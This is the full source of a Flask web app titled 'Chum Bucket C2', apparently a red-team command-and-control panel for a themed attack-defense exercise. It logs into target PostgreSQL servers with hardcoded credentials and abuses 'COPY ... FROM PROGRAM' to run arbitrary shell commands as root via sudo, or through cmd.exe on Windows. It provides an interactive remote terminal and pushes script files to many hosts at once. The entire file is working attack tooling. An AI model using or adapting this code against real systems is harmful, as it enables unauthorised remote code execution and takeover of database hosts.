#!/usr/bin/env python3
from flask import Flask, render_template_string, request, jsonify
import psycopg2
import threading
import os
import re
import json

app = Flask(__name__)

@app.before_request
def localhost_only():
    if request.remote_addr != '127.0.0.1':
        from flask import abort
        abort(403)

TARGETS = {
    # Linux - 10.111.1.x
    "shellphone":    {"ip": "10.111.1.1", "service": "SMB",                   "os": "linux"},
    "bottlemail":    {"ip": "10.111.1.2", "service": "SMTP",                  "os": "linux"},
    "pattyvault":    {"ip": "10.111.1.3", "service": "PostgreSQL",            "os": "linux"},
    "thesafe":       {"ip": "10.111.1.4", "service": "Apache",                "os": "linux"},
    "krustyfront":   {"ip": "10.111.1.5", "service": "Nginx",                 "os": "linux"},
    # Windows - 10.111.2.x
    "treedome":      {"ip": "10.111.2.1", "service": "AD/DNS",                "os": "windows"},
    "goldenspatula": {"ip": "10.111.2.2", "service": "Certificate Authority", "os": "windows"},
    "orderwindow":   {"ip": "10.111.2.3", "service": "IIS",                   "os": "windows"},
    "bubblechat":    {"ip": "10.111.2.4", "service": "Openfire",              "os": "windows"},
    "kelpdelivery":  {"ip": "10.111.2.5", "service": "Telnet",                "os": "windows"},
}

PG_PORT     = 8443
PG_DB       = "telemetry"
PG_USER     = "ntmon"
PG_PASSWORD = "M0n1t0r$vc!"

SCRIPTS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "scripts")

terminal_cwd = {}
terminal_history = {}
terminal_lock = threading.Lock()

HTML = r"""
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Chum Bucket C2</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: #0a0a0f;
      color: #c8f0c8;
      font-family: 'Courier New', monospace;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    /* ---- header ---- */
    header {
      background: #111820;
      border-bottom: 2px solid #1a4a1a;
      padding: 12px 24px;
      display: flex;
      align-items: center;
      gap: 16px;
      flex-shrink: 0;
    }
    header h1 { font-size: 1.3rem; color: #4ade80; letter-spacing: 2px; }
    header .subtitle { font-size: 0.72rem; color: #6b7280; }
    .status-dot {
      width: 10px; height: 10px; border-radius: 50%;
      background: #4ade80; box-shadow: 0 0 8px #4ade80;
      animation: pulse 2s infinite; flex-shrink: 0;
    }
    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }

    /* ---- tabs ---- */
    .tabs {
      display: flex;
      background: #0d1117;
      border-bottom: 1px solid #1a4a1a;
      flex-shrink: 0;
    }
    .tab-btn {
      padding: 10px 28px;
      font-family: 'Courier New', monospace;
      font-size: 0.8rem;
      letter-spacing: 1px;
      color: #6b7280;
      background: none;
      border: none;
      border-bottom: 2px solid transparent;
      cursor: pointer;
      transition: color .15s, border-color .15s;
      text-transform: uppercase;
    }
    .tab-btn:hover { color: #c8f0c8; }
    .tab-btn.active { color: #4ade80; border-bottom-color: #4ade80; }

    /* ---- tab panels ---- */
    .tab-panel { display: none; flex: 1; overflow: hidden; min-height: 0; }
    .tab-panel.active { display: flex; }

    /* ---- shared sidebar layout ---- */
    .layout {
      display: grid;
      grid-template-columns: 220px 1fr;
      flex: 1;
      overflow: hidden;
      min-height: 0;
    }
    .sidebar {
      background: #0d1117;
      border-right: 1px solid #1a4a1a;
      padding: 12px;
      overflow-y: auto;
      display: flex;
      flex-direction: column;
      gap: 6px;
    }
    .sidebar-label {
      font-size: 0.62rem;
      color: #4b5563;
      letter-spacing: 2px;
      text-transform: uppercase;
      margin-bottom: 2px;
      flex-shrink: 0;
    }
    .sidebar-action-btn {
      width: 100%;
      background: #1a3a1a;
      border: 1px solid #2a5a2a;
      color: #4ade80;
      padding: 7px;
      border-radius: 5px;
      cursor: pointer;
      font-family: 'Courier New', monospace;
      font-size: 0.72rem;
      transition: background .15s;
      flex-shrink: 0;
    }
    .sidebar-action-btn:hover { background: #223a22; }

    /* target cards */
    .target-card {
      background: #111820;
      border: 1px solid #1a3a1a;
      border-radius: 5px;
      padding: 8px 10px;
      cursor: pointer;
      transition: border-color .15s, background .15s;
      position: relative;
      user-select: none;
      flex-shrink: 0;
    }
    .target-card:hover { border-color: #4ade80; }
    .target-card.selected { border-color: #4ade80; background: #0f1f0f; }
    .target-card.os-mismatch { opacity: .35; cursor: not-allowed; }
    .target-card .t-name { font-size: 0.8rem; color: #e2e8f0; font-weight: bold; }
    .target-card .t-meta { font-size: 0.65rem; color: #6b7280; margin-top: 2px; }
    .target-card .indicator {
      position: absolute; top: 9px; right: 9px;
      width: 7px; height: 7px; border-radius: 50%; background: #6b7280;
    }
    .target-card.online  .indicator { background: #4ade80; box-shadow: 0 0 5px #4ade80; }
    .target-card.offline .indicator { background: #ef4444; }

    /* ======================================================
       TERMINAL TAB
       ====================================================== */
    .term-main {
      display: flex;
      flex-direction: column;
      background: #0a0a0f;
      overflow: hidden;
      flex: 1;
      min-height: 0;
    }

    /* scrollback */
    .term-output {
      flex: 1;
      overflow-y: auto;
      padding: 14px 16px;
      font-size: 0.82rem;
      line-height: 1.6;
      min-height: 0;
    }
    .term-no-host {
      color: #374151;
      padding-top: 40px;
      text-align: center;
      font-size: 0.8rem;
    }
    .term-entry { margin-bottom: 6px; }
    .term-prompt {
      color: #4ade80;
      white-space: pre-wrap;
      word-break: break-all;
    }
    .term-out-ok {
      color: #c8f0c8;
      white-space: pre-wrap;
      word-break: break-word;
      padding-left: 2px;
    }
    .term-out-err {
      color: #fca5a5;
      white-space: pre-wrap;
      word-break: break-word;
      padding-left: 2px;
    }
    .term-spinner {
      color: #6b7280;
      font-style: italic;
    }

    /* input bar */
    .term-input-bar {
      border-top: 1px solid #1a4a1a;
      padding: 10px 14px;
      display: flex;
      align-items: center;
      gap: 8px;
      flex-shrink: 0;
      background: #0d1117;
    }
    .term-prompt-label {
      color: #4ade80;
      font-size: 0.82rem;
      white-space: nowrap;
      flex-shrink: 0;
    }
    .term-input {
      flex: 1;
      background: transparent;
      border: none;
      outline: none;
      color: #c8f0c8;
      font-family: 'Courier New', monospace;
      font-size: 0.82rem;
      caret-color: #4ade80;
    }
    .term-input::placeholder { color: #374151; }
    .term-input:disabled { opacity: .5; }

    /* ======================================================
       DEPLOY TAB
       ====================================================== */
    .deploy-main {
      display: flex; flex-direction: column; background: #0a0a0f;
      overflow: hidden; flex: 1; min-height: 0;
    }
    .deploy-top {
      display: grid; grid-template-columns: 1fr 1fr;
      border-bottom: 1px solid #1a4a1a; flex-shrink: 0; max-height: 50%;
    }
    .script-picker {
      border-right: 1px solid #1a4a1a; padding: 12px; overflow-y: auto;
    }
    .script-picker h3 {
      font-size: 0.62rem; color: #4b5563; letter-spacing: 2px;
      text-transform: uppercase; margin-bottom: 8px;
    }
    .script-card {
      background: #111820; border: 1px solid #1a3a1a; border-radius: 5px;
      padding: 8px 10px; margin-bottom: 6px; cursor: pointer;
      transition: border-color .15s, background .15s; user-select: none;
    }
    .script-card:hover { border-color: #4ade80; }
    .script-card.selected { border-color: #4ade80; background: #0f1f0f; }
    .script-card .s-name { font-size: 0.8rem; color: #e2e8f0; font-weight: bold; }
    .script-card .s-meta { font-size: 0.65rem; color: #6b7280; margin-top: 2px; }
    .os-badge {
      display: inline-block; font-size: 0.58rem; font-weight: bold;
      padding: 1px 5px; border-radius: 3px; margin-left: 5px; vertical-align: middle;
    }
    .os-linux   { background: #14532d; color: #4ade80; }
    .os-windows { background: #1e3a5f; color: #60a5fa; }
    .os-both    { background: #3b2f00; color: #fbbf24; }
    .no-scripts { font-size: 0.76rem; color: #4b5563; padding: 6px 0; }

    .deploy-preview { padding: 12px; overflow-y: auto; background: #0a0a0f; }
    .deploy-preview h3 {
      font-size: 0.62rem; color: #4b5563; letter-spacing: 2px;
      text-transform: uppercase; margin-bottom: 8px;
    }
    .script-content {
      background: #0d1117; border: 1px solid #1a3a1a; border-radius: 5px;
      padding: 10px 12px; font-size: 0.74rem; line-height: 1.5;
      white-space: pre-wrap; word-break: break-word; color: #a3e6a3;
      max-height: 180px; overflow-y: auto;
    }
    .no-preview { font-size: 0.76rem; color: #4b5563; }

    .deploy-bar {
      padding: 10px 14px; border-bottom: 1px solid #1a4a1a;
      display: flex; gap: 10px; align-items: center; flex-shrink: 0;
    }
    .deploy-info { font-size: 0.73rem; color: #6b7280; flex: 1; }
    .deploy-btn {
      background: #1e3a5f; border: 1px solid #60a5fa; color: #60a5fa;
      padding: 8px 18px; border-radius: 5px; cursor: pointer;
      font-family: 'Courier New', monospace; font-size: 0.8rem; font-weight: bold;
      transition: background .15s; white-space: nowrap;
    }
    .deploy-btn:hover { background: #1e3351; }
    .deploy-btn:disabled { opacity: .4; cursor: not-allowed; }

    .deploy-output { flex: 1; overflow-y: auto; padding: 12px; min-height: 0; }
    .deploy-result {
      background: #0d1117; border: 1px solid #1a3a1a; border-radius: 6px;
      margin-bottom: 10px; overflow: hidden;
    }
    .deploy-result-header {
      background: #111820; padding: 6px 10px;
      display: flex; justify-content: space-between; align-items: center;
      border-bottom: 1px solid #1a3a1a; gap: 8px;
    }
    .dr-host   { font-size: 0.76rem; color: #4ade80; font-weight: bold; }
    .dr-script { font-size: 0.68rem; color: #6b7280; }
    .dr-ts     { font-size: 0.65rem; color: #374151; flex-shrink: 0; }
    .deploy-result-body {
      padding: 8px 10px; font-size: 0.76rem; line-height: 1.5;
      white-space: pre-wrap; word-break: break-word;
    }
    .deploy-result-body.ok   { color: #bbf7d0; }
    .deploy-result-body.err  { color: #fca5a5; }
    .deploy-result-body.skip { color: #6b7280; font-style: italic; }

    .empty-state {
      display: flex; flex-direction: column; align-items: center;
      justify-content: center; height: 100%; gap: 8px; color: #374151;
    }
    .empty-state .big { font-size: 2rem; }
    .empty-state p { font-size: 0.76rem; }
  </style>
</head>
<body>

<header>
  <div class="status-dot"></div>
  <div>
    <h1>CHUM BUCKET C2</h1>
    <div class="subtitle">Red Team Command &amp; Control — Krusty Krab vs Chum Bucket</div>
  </div>
</header>

<div class="tabs">
  <button class="tab-btn active" id="tab-btn-terminal" onclick="switchTab('terminal', this)">[ TERMINAL ]</button>
  <button class="tab-btn"        id="tab-btn-deploy"   onclick="switchTab('deploy', this)">[ SCRIPT DEPLOY ]</button>
</div>

<!-- ======================================================
     TERMINAL TAB
     ====================================================== -->
<div class="tab-panel active" id="tab-terminal">
  <div class="layout">

    <aside class="sidebar" id="term-sidebar">
      <div class="sidebar-label">Select Host</div>
      <div id="term-target-list"></div>
    </aside>

    <div class="term-main">
      <div class="term-output" id="term-output">
        <div class="term-no-host">Select a host to open a terminal.</div>
      </div>
      <div class="term-input-bar">
        <span class="term-prompt-label" id="term-prompt-label">$</span>
        <input class="term-input" id="term-input" type="text"
          placeholder="Select a host first..."
          disabled
          autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"
          onkeydown="termKeydown(event)" />
        <button id="term-reset-btn" onclick="resetCwd()" title="Reset working directory to home"
          style="margin-left:6px;padding:2px 8px;background:#1f2937;border:1px solid #374151;color:#9ca3af;border-radius:3px;cursor:pointer;font-size:.7rem;display:none">⌂ reset cwd</button>
      </div>
    </div>

  </div>
</div>

<!-- ======================================================
     DEPLOY TAB
     ====================================================== -->
<div class="tab-panel" id="tab-deploy">
  <div class="layout">

    <aside class="sidebar" id="deploy-sidebar">
      <div class="sidebar-label">Targets</div>
      <button class="sidebar-action-btn" onclick="toggleAll()">[ SELECT ALL ]</button>
      <div id="deploy-target-list"></div>
    </aside>

    <div class="deploy-main">
      <div class="deploy-top">
        <div class="script-picker">
          <h3>Scripts</h3>
          <button class="sidebar-action-btn" style="margin-bottom:8px" onclick="loadScripts()">↺ Reload</button>
          <div id="script-list"><div class="no-scripts">Loading...</div></div>
        </div>
        <div class="deploy-preview">
          <h3>Preview</h3>
          <div id="script-preview"><div class="no-preview">Select a script to preview.</div></div>
        </div>
      </div>

      <div class="deploy-bar">
        <span class="deploy-info" id="deploy-info">No script selected.</span>
        <button class="deploy-btn" id="deploy-btn" onclick="runDeploy()" disabled>DEPLOY</button>
      </div>

      <div class="deploy-output" id="deploy-output">
        <div class="empty-state">
          <div class="big">⬡</div>
          <p>Select a script and targets, then deploy.</p>
        </div>
      </div>
    </div>

  </div>
</div>

<script>
const TARGETS = """ + "{{ targets_json | safe }}" + r""";

// ============================================================
// Tab switching
// ============================================================
function switchTab(name, btn) {
  document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
  document.getElementById('tab-' + name).classList.add('active');
  btn.classList.add('active');
  if (name === 'deploy') loadScripts();
  if (name === 'terminal' && activeHost) focusInput();
}

// ============================================================
// Ping (updates both sidebars)
// ============================================================
function pingAll() {
  fetch('/ping').then(r => r.json()).then(data => {
    for (const [name, online] of Object.entries(data)) {
      for (const prefix of ['term-card-', 'deploy-card-']) {
        const card = document.getElementById(prefix + name);
        if (card) { card.classList.remove('online','offline'); card.classList.add(online ? 'online' : 'offline'); }
      }
    }
  }).catch(() => {});
}

// ============================================================
// TERMINAL TAB
// ============================================================
let activeHost   = null;   // host name string
let termBusy     = false;
let cmdHistory   = [];     // input history for up/down arrow
let historyIdx   = -1;
let draftCmd     = '';

// per-host scrollback stored in JS (mirrors server-side, rebuilt on host switch)
const scrollbacks = {};  // { hostName: [ {prompt, output, error} ] }

function buildTermSidebar() {
  const container = document.getElementById('term-target-list');
  container.innerHTML = '';
  for (const [name, info] of Object.entries(TARGETS)) {
    const card = document.createElement('div');
    card.className = 'target-card';
    card.id = 'term-card-' + name;
    const osLabel = info.os === 'windows' ? 'WIN' : 'LNX';
    const osColor = info.os === 'windows' ? '#60a5fa' : '#4ade80';
    card.innerHTML = `
      <div class="indicator"></div>
      <div class="t-name">${esc(name)} <span style="font-size:.6rem;color:${osColor};margin-left:3px">[${osLabel}]</span></div>
      <div class="t-meta">${esc(info.ip)} &middot; ${esc(info.service)}</div>
    `;
    card.onclick = () => selectHost(name);
    container.appendChild(card);
  }
}

function selectHost(name) {
  // deselect old
  if (activeHost) {
    const old = document.getElementById('term-card-' + activeHost);
    if (old) old.classList.remove('selected');
  }
  activeHost = name;
  const card = document.getElementById('term-card-' + name);
  if (card) card.classList.add('selected');

  // restore scrollback
  renderScrollback(name);

  // fetch real cwd from server so prompt label is accurate after host switch
  fetch('/terminal/exec', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({target: name, command: ''})
  }).then(r => r.json()).then(d => {
    updatePromptLabel(d.cwd);
  }).catch(() => updatePromptLabel('~'));

  // enable input and show reset button
  const input = document.getElementById('term-input');
  input.disabled = false;
  input.placeholder = '';
  document.getElementById('term-reset-btn').style.display = '';
  focusInput();
}

async function resetCwd() {
  if (!activeHost) return;
  await fetch('/terminal/reset', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({target: activeHost})
  });
  updatePromptLabel('~');
}

function focusInput() {
  document.getElementById('term-input').focus();
}

function updatePromptLabel(cwd) {
  if (!activeHost) return;
  const info = TARGETS[activeHost];
  const dir  = cwd || '~';
  // ntmon@hostname:cwd$
  document.getElementById('term-prompt-label').textContent =
    `ntmon@${activeHost}:${dir}$`;
}

function renderScrollback(hostName) {
  const output = document.getElementById('term-output');
  output.innerHTML = '';
  const entries = scrollbacks[hostName] || [];
  if (entries.length === 0) {
    output.innerHTML = `<div class="term-no-host" style="padding-top:20px;text-align:left">Connected to <strong style="color:#4ade80">${esc(hostName)}</strong>. Type a command.</div>`;
    return;
  }
  for (const e of entries) {
    appendEntryDOM(e.prompt, e.output, e.error);
  }
  scrollToBottom();
}

function appendEntryDOM(prompt, output, isError) {
  const output_area = document.getElementById('term-output');
  // remove "no host" placeholder if present
  const placeholder = output_area.querySelector('.term-no-host');
  if (placeholder) placeholder.remove();

  const entry = document.createElement('div');
  entry.className = 'term-entry';
  const promptEl = document.createElement('div');
  promptEl.className = 'term-prompt';
  promptEl.textContent = prompt;
  entry.appendChild(promptEl);
  if (output) {
    const outEl = document.createElement('div');
    outEl.className = isError ? 'term-out-err' : 'term-out-ok';
    outEl.textContent = output;
    entry.appendChild(outEl);
  }
  output_area.appendChild(entry);
}

function scrollToBottom() {
  const o = document.getElementById('term-output');
  o.scrollTop = o.scrollHeight;
}

function addSpinner(promptText) {
  const output_area = document.getElementById('term-output');
  const placeholder = output_area.querySelector('.term-no-host');
  if (placeholder) placeholder.remove();

  const entry = document.createElement('div');
  entry.className = 'term-entry';
  entry.id = 'term-spinner-entry';

  const promptEl = document.createElement('div');
  promptEl.className = 'term-prompt';
  promptEl.textContent = promptText;
  entry.appendChild(promptEl);

  const spinEl = document.createElement('div');
  spinEl.className = 'term-spinner';
  spinEl.id = 'term-spinner';
  spinEl.textContent = '...';
  entry.appendChild(spinEl);

  output_area.appendChild(entry);
  scrollToBottom();
}

function removeSpinner() {
  const s = document.getElementById('term-spinner-entry');
  if (s) s.remove();
}

function termKeydown(e) {
  if (e.key === 'Enter') {
    const val = e.target.value;
    e.target.value = '';
    historyIdx = -1;
    draftCmd = '';
    runTermCommand(val.trim());
    return;
  }
  if (e.key === 'ArrowUp') {
    e.preventDefault();
    if (cmdHistory.length === 0) return;
    if (historyIdx === -1) draftCmd = e.target.value;
    historyIdx = Math.min(historyIdx + 1, cmdHistory.length - 1);
    e.target.value = cmdHistory[historyIdx];
    return;
  }
  if (e.key === 'ArrowDown') {
    e.preventDefault();
    if (historyIdx === -1) return;
    historyIdx--;
    e.target.value = historyIdx === -1 ? draftCmd : cmdHistory[historyIdx];
    return;
  }
}

async function runTermCommand(cmd) {
  if (!activeHost || termBusy) return;
  if (!cmd) return;

  // client-side: clear
  if (cmd === 'clear') {
    scrollbacks[activeHost] = [];
    document.getElementById('term-output').innerHTML =
      `<div class="term-no-host" style="padding-top:20px;text-align:left">Connected to <strong style="color:#4ade80">${esc(activeHost)}</strong>. Type a command.</div>`;
    return;
  }

  // push to arrow-up history (most recent first)
  cmdHistory.unshift(cmd);
  if (cmdHistory.length > 200) cmdHistory.pop();

  const promptText = document.getElementById('term-prompt-label').textContent + ' ' + cmd;

  termBusy = true;
  document.getElementById('term-input').disabled = true;
  addSpinner(promptText);

  let output, isError, newCwd;
  try {
    const res = await fetch('/terminal/exec', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({target: activeHost, command: cmd})
    });
    const d = await res.json();
    output  = d.output;
    isError = d.error;
    newCwd  = d.cwd || '~';
  } catch(err) {
    output  = err.toString();
    isError = true;
    newCwd  = null;
  }

  removeSpinner();

  // store in scrollback
  if (!scrollbacks[activeHost]) scrollbacks[activeHost] = [];
  scrollbacks[activeHost].push({prompt: promptText, output, error: isError});

  appendEntryDOM(promptText, output, isError);
  scrollToBottom();

  if (newCwd) updatePromptLabel(newCwd);

  termBusy = false;
  document.getElementById('term-input').disabled = false;
  focusInput();
}

// ============================================================
// DEPLOY TAB
// ============================================================
const deploySelected = new Set();
let selectedScript   = null;
let scripts          = [];

function buildDeploySidebar() {
  const container = document.getElementById('deploy-target-list');
  container.innerHTML = '';
  for (const [name, info] of Object.entries(TARGETS)) {
    const card = document.createElement('div');
    card.className = 'target-card';
    card.id = 'deploy-card-' + name;
    const osLabel = info.os === 'windows' ? 'WIN' : 'LNX';
    const osColor = info.os === 'windows' ? '#60a5fa' : '#4ade80';
    card.innerHTML = `
      <div class="indicator"></div>
      <div class="t-name">${esc(name)} <span style="font-size:.6rem;color:${osColor};margin-left:3px">[${osLabel}]</span></div>
      <div class="t-meta">${esc(info.ip)} &middot; ${esc(info.service)}</div>
    `;
    card.onclick = () => toggleDeployTarget(name, card);
    container.appendChild(card);
  }
}

function toggleDeployTarget(name, card) {
  if (card.classList.contains('os-mismatch')) return;
  if (deploySelected.has(name)) {
    deploySelected.delete(name);
    card.classList.remove('selected');
  } else {
    deploySelected.add(name);
    card.classList.add('selected');
  }
  updateDeployInfo();
}

function toggleAll() {
  const allEligible = Object.keys(TARGETS).filter(n => {
    const c = document.getElementById('deploy-card-' + n);
    return c && !c.classList.contains('os-mismatch');
  });
  const allSel = allEligible.every(n => deploySelected.has(n));
  allEligible.forEach(n => {
    const c = document.getElementById('deploy-card-' + n);
    if (allSel) { deploySelected.delete(n); c.classList.remove('selected'); }
    else         { deploySelected.add(n);    c.classList.add('selected'); }
  });
  updateDeployInfo();
}

function loadScripts() {
  document.getElementById('script-list').innerHTML = '<div class="no-scripts">Loading...</div>';
  fetch('/scripts').then(r => r.json()).then(data => {
    scripts = data;
    renderScriptList();
    applyOsMismatch();
  }).catch(() => {
    document.getElementById('script-list').innerHTML = '<div class="no-scripts">Failed to load.</div>';
  });
}

function renderScriptList() {
  const container = document.getElementById('script-list');
  if (scripts.length === 0) {
    container.innerHTML = '<div class="no-scripts">No scripts in scripts/ folder.</div>';
    return;
  }
  container.innerHTML = '';
  for (const s of scripts) {
    const card = document.createElement('div');
    card.className = 'script-card' + (selectedScript && selectedScript.name === s.name ? ' selected' : '');
    card.id = 'sc-' + s.name;
    const bc = s.os === 'linux' ? 'os-linux' : s.os === 'windows' ? 'os-windows' : 'os-both';
    const bl = s.os === 'both' ? 'LINUX+WIN' : s.os.toUpperCase();
    card.innerHTML = `
      <div class="s-name">${esc(s.name)} <span class="os-badge ${bc}">${bl}</span></div>
      <div class="s-meta">${esc(s.description || '')}</div>
    `;
    card.onclick = () => selectScript(s);
    container.appendChild(card);
  }
}

function selectScript(s) {
  selectedScript = s;
  document.querySelectorAll('.script-card').forEach(c => c.classList.remove('selected'));
  const card = document.getElementById('sc-' + s.name);
  if (card) card.classList.add('selected');
  document.getElementById('script-preview').innerHTML =
    `<div class="script-content">${esc(s.content)}</div>`;
  applyOsMismatch();
  updateDeployInfo();
}

function applyOsMismatch() {
  for (const [name, info] of Object.entries(TARGETS)) {
    const card = document.getElementById('deploy-card-' + name);
    if (!card) continue;
    const mismatch = selectedScript &&
      selectedScript.os !== 'both' &&
      selectedScript.os !== info.os;
    if (mismatch) {
      card.classList.add('os-mismatch');
      card.classList.remove('selected');
      deploySelected.delete(name);
    } else {
      card.classList.remove('os-mismatch');
    }
  }
  updateDeployInfo();
}

function updateDeployInfo() {
  const info = document.getElementById('deploy-info');
  const btn  = document.getElementById('deploy-btn');
  if (!selectedScript) { info.textContent = 'No script selected.'; btn.disabled = true; return; }
  if (deploySelected.size === 0) {
    info.textContent = `Script: ${selectedScript.name} — no targets selected.`;
    btn.disabled = true; return;
  }
  info.textContent = `Deploy "${selectedScript.name}" → ${[...deploySelected].join(', ')}`;
  btn.disabled = false;
}

function ts() { return new Date().toLocaleTimeString(); }
function esc(s) {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

function appendDeployResult(hostname, scriptName, output, status) {
  const area = document.getElementById('deploy-output');
  const empty = area.querySelector('.empty-state');
  if (empty) empty.remove();
  const block = document.createElement('div');
  block.className = 'deploy-result';
  block.innerHTML = `
    <div class="deploy-result-header">
      <span class="dr-host">${esc(hostname)}</span>
      <span class="dr-script">${esc(scriptName)}</span>
      <span class="dr-ts">${ts()}</span>
    </div>
    <div class="deploy-result-body ${status}">${esc(output)}</div>
  `;
  area.prepend(block);
}

async function runDeploy() {
  if (!selectedScript || deploySelected.size === 0) return;
  const btn = document.getElementById('deploy-btn');
  btn.disabled = true;
  const results = await Promise.all([...deploySelected].map(name =>
    fetch('/deploy', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({target: name, script: selectedScript.name})
    }).then(r => r.json()).then(d => ({name, ...d}))
      .catch(e => ({name, output: e.toString(), status: 'err'}))
  ));
  for (const r of results) appendDeployResult(r.name, selectedScript.name, r.output, r.status);
  btn.disabled = (deploySelected.size === 0);
}

// ============================================================
// Init
// ============================================================
buildTermSidebar();
buildDeploySidebar();
pingAll();
setInterval(pingAll, 15000);
</script>
</body>
</html>
"""


def get_conn(ip):
    return psycopg2.connect(
        host=ip,
        port=PG_PORT,
        dbname=PG_DB,
        user=PG_USER,
        password=PG_PASSWORD,
        connect_timeout=5
    )


def build_shell_cmd(command, target_os):
    if target_os == "windows":
        safe_cmd = command.replace('"', '\\"')
        return f'cmd.exe /c "{safe_cmd}" 2>&1'
    else:
        safe_cmd = command.replace("'", "'\"'\"'")
        return f"sudo /bin/bash -c '{safe_cmd}' 2>&1"


def run_command(ip, command, target_os="linux"):
    shell_cmd = build_shell_cmd(command, target_os)
    conn = None
    try:
        conn = get_conn(ip)
        conn.autocommit = True
        cur = conn.cursor()
        cur.execute("DELETE FROM events;")
        cur.execute(f"COPY events FROM PROGRAM $CMD${shell_cmd}$CMD$;")
        cur.execute("SELECT line FROM events;")
        rows = cur.fetchall()
        output = "\n".join(r[0] for r in rows) if rows else "(no output)"
        cur.execute("DELETE FROM events;")
        return output, None
    except Exception as e:
        return None, str(e)
    finally:
        if conn:
            conn.close()


def run_command_with_cwd(ip, command, target_os, cwd):
    """Run command prefixed with cd to tracked cwd, then capture new cwd."""
    if target_os == "windows":
        cd_rewrite = re.match(r'^cd\s+(?!/d\s)(.+)$', command, re.IGNORECASE)
        if cd_rewrite:
            command = f'cd /d {cd_rewrite.group(1)}'
        if not cwd or cwd == "~":
            full_cmd = f'{command} && cd'
        else:
            full_cmd = f'cd /d "{cwd}" && {command} && cd'
    else:
        if cwd and cwd != "~":
            full_cmd = f'cd {cwd} && {command} && pwd'
        else:
            full_cmd = f'{command} && pwd'

    output, error = run_command(ip, full_cmd, target_os)
    if error:
        return None, error, cwd  # keep old cwd on error

    if target_os == "windows":
        lines = output.strip().splitlines()
        last = lines[-1].strip() if lines else ""
        new_cwd = last if (len(last) >= 3 and last[1:3] == ":\\") else cwd
        display_output = "\n".join(lines[:-1]).strip() if len(lines) > 1 else "(no output)"
    else:
        lines = output.strip().splitlines()
        last = lines[-1].strip() if lines else ""
        new_cwd = last if last.startswith("/") else cwd
        display_output = "\n".join(lines[:-1]).strip() if len(lines) > 1 else "(no output)"

    return display_output or "(no output)", None, new_cwd


def check_alive(ip):
    try:
        conn = get_conn(ip)
        conn.close()
        return True
    except Exception:
        return False


def load_scripts():
    result = []
    if not os.path.isdir(SCRIPTS_DIR):
        return result
    for fname in sorted(os.listdir(SCRIPTS_DIR)):
        fpath = os.path.join(SCRIPTS_DIR, fname)
        if not os.path.isfile(fpath):
            continue
        try:
            with open(fpath, "r", errors="replace") as f:
                content = f.read()
        except Exception:
            continue
        script_os   = "linux"
        description = ""
        for line in content.splitlines()[:10]:
            stripped = line.strip().lstrip("#").lstrip("REM").strip()
            if stripped.lower().startswith("os:"):
                val = stripped[3:].strip().lower()
                if val in ("linux", "windows", "both"):
                    script_os = val
            elif stripped.lower().startswith("description:"):
                description = stripped[12:].strip()
        result.append({"name": fname, "os": script_os, "description": description, "content": content})
    return result



@app.route('/')
def index():
    return render_template_string(HTML, targets_json=json.dumps(TARGETS))


@app.route('/ping')
def ping():
    results = {}
    threads = []
    def do_ping(name, info):
        results[name] = check_alive(info['ip'])
    for name, info in TARGETS.items():
        t = threading.Thread(target=do_ping, args=(name, info))
        threads.append(t)
        t.start()
    for t in threads:
        t.join(timeout=6)
    return jsonify(results)


@app.route('/terminal/exec', methods=['POST'])
def terminal_exec():
    data        = request.get_json()
    target_name = data.get('target')
    command     = data.get('command', '').strip()

    if not target_name or target_name not in TARGETS:
        return jsonify({'output': 'Unknown target', 'error': True, 'cwd': '~'})
    if not command:
        return jsonify({'output': '', 'error': False, 'cwd': terminal_cwd.get(target_name, '~')})

    target_os = TARGETS[target_name]['os']
    ip        = TARGETS[target_name]['ip']

    with terminal_lock:
        cwd = terminal_cwd.get(target_name, '~')

    output, error, new_cwd = run_command_with_cwd(ip, command, target_os, cwd)

    with terminal_lock:
        terminal_cwd[target_name] = new_cwd

    if error:
        return jsonify({'output': f'Error: {error}', 'error': True, 'cwd': cwd})

    return jsonify({'output': output, 'error': False, 'cwd': new_cwd})


@app.route('/terminal/reset', methods=['POST'])
def terminal_reset():
    data        = request.get_json()
    target_name = data.get('target')
    if not target_name or target_name not in TARGETS:
        return jsonify({'ok': False})
    with terminal_lock:
        terminal_cwd.pop(target_name, None)
    return jsonify({'ok': True})


@app.route('/scripts')
def scripts_list():
    return jsonify(load_scripts())


@app.route('/deploy', methods=['POST'])
def deploy():
    data        = request.get_json()
    target_name = data.get('target')
    script_name = data.get('script', '').strip()

    if not target_name or target_name not in TARGETS:
        return jsonify({'output': 'Unknown target', 'status': 'err'})
    if not script_name:
        return jsonify({'output': 'No script specified', 'status': 'err'})

    all_scripts = load_scripts()
    script = next((s for s in all_scripts if s['name'] == script_name), None)
    if not script:
        return jsonify({'output': f'Script not found: {script_name}', 'status': 'err'})

    target_os = TARGETS[target_name]['os']
    if script['os'] != 'both' and script['os'] != target_os:
        return jsonify({
            'output': f'Skipped — script is {script["os"]}, target is {target_os}',
            'status': 'skip'
        })

    ip = TARGETS[target_name]['ip']
    lines = [l for l in script['content'].splitlines()
             if l.strip()
             and not l.strip().upper().startswith('REM ')
             and not l.strip().startswith('#')]
    cmd = ' & '.join(lines) if target_os == 'windows' else '\n'.join(lines)
    output, error = run_command(ip, cmd, target_os)
    if error:
        return jsonify({'output': f'Error: {error}', 'status': 'err'})
    return jsonify({'output': output, 'status': 'ok'})


if __name__ == '__main__':
    print(f"Chum Bucket C2 starting on http://127.0.0.1:9000 (localhost only)")
    print(f"Scripts directory: {SCRIPTS_DIR}")
    app.run(host='127.0.0.1', port=9000, debug=False)
